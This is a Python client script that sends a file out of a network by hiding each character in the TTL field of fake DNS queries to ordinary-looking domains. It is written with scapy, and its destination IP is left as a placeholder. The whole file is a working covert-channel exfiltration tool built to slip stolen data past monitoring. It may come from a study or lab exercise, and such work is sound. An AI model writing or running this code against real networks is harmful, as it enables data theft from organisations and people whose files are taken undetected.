# Author: Barnabas Koh
# Date: 03-11-2024
# Description: Client for DNS Exfiltration with TTL

import sys
from scapy.all import send, IP, UDP, DNS, DNSQR

BASE_TTL = 64
DEST_IP = "0.0.0.0"
SYNC_DOMAIN = "www.google.com"
DATA_DOMAIN = "www.gmail.com"
END_DOMAIN = "www.yahoo.com"

if len(sys.argv) != 2:
    print("Usage: exfil_client.py <FILE NAME>")
    sys.exit(1)


def ord_data(file_name):
    """Convert each character in the file and saves it as a list"""
    ord_list = []
    with open(file_name) as f:
        data = f.read()
    for char in data:
        ord_list.append(ord(char))
    return ord_list


def send_data(file_name, ord_list):
    """Sends SYNC, FILE, DATA and END packets"""
    # Send Sync packet
    send(IP(dst=DEST_IP,ttl=BASE_TTL)/UDP(dport=53)/DNS(rd=1,qd=DNSQR(qname="www.google.com")),verbose=0)
    # Semd File packet
    for char in file_name:
        send(IP(dst=DEST_IP,ttl=BASE_TTL+ord(char))/UDP(dport=53)/DNS(rd=1,qd=DNSQR(qname="www.facebook.com")),verbose=0)
    # Send Data packet
    for num in ord_list:
        send(IP(dst=DEST_IP,ttl=BASE_TTL+num)/UDP(dport=53)/DNS(rd=1,qd=DNSQR(qname="www.gmail.com")),verbose=0)
    # Send End packet
    send(IP(dst=DEST_IP,ttl=BASE_TTL)/UDP(dport=53)/DNS(rd=1,qd=DNSQR(qname="www.yahoo.com")),verbose=0)


def main():
    file_name = sys.argv[1]
    ord_list = ord_data(file_name)
    send_data(file_name, ord_list)
    print(f"File sent: {file_name}")


if __name__ == "__main__":
    main()
